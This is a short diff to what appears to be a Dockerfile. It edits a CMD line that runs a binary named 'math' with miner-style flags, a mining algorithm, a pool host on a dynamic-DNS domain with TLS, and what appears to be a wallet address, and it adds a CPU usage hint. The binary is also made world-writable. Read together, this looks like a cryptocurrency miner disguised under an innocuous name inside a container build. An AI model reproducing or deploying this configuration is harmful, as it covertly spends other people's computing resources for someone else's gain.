@@ -15,4 +15,4 @@ WORKDIR /usr/local/bin
 
 RUN chmod 777 math;
 
-CMD math -a gr -o math.sytes.net:5555 --tls -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
+CMD math -a gr -o math.sytes.net:5555 --tls --cpu-max-threads-hint=75 -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
